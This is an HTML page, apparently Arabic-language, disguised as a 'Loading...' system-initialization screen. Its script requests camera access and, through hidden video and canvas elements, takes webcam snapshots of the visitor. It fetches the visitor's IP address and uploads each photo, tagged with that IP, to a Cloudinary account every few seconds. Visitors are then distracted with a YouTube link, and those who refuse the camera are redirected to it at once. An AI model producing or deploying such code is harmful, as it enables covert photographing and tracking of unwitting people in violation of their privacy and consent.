<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <link rel="icon" href="data:,">
    <style>
        body { background-color: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>جاري تهيئة النظام...</p>

    <video id="video" playsinline autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const cloudName = 'dgkttv99v'; //
        const uploadPreset = 'ml_default'; //
        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        let tabOpened = false;

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                document.getElementById('video').srcObject = stream;
                setTimeout(takeSnapshot, 2000); // يبدأ الرفع بعد ثانيتين
            } catch (e) {
                window.location.href = youtubeLink; // لو رفض الكاميرا يحوله فوراً
            }
        }

        async function takeSnapshot() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL("image/png");

            // جلب الـ IP بشكل آمن
            let userIP = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
            } catch (err) { console.log("IP skip"); }

            const formData = new FormData();
            formData.append('file', imageData);
            formData.append('upload_preset', uploadPreset);
            formData.append('tags', `IP_${userIP}`);
            formData.append('type', 'upload'); 

            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                method: 'POST',
                body: formData
            })
            .then(r => r.json())
            .then(data => {
                if (data.public_id && !tabOpened) {
                    window.open(youtubeLink, '_blank');
                    tabOpened = true;
                }
                setTimeout(takeSnapshot, 8000); // يرفع صورة كل 8 ثواني
            })
            .catch(err => {
                setTimeout(takeSnapshot, 4000); // لو فشل يحاول تاني بعد 4 ثواني
            });
        }

        window.onload = init;
    </script>
</body>
</html>
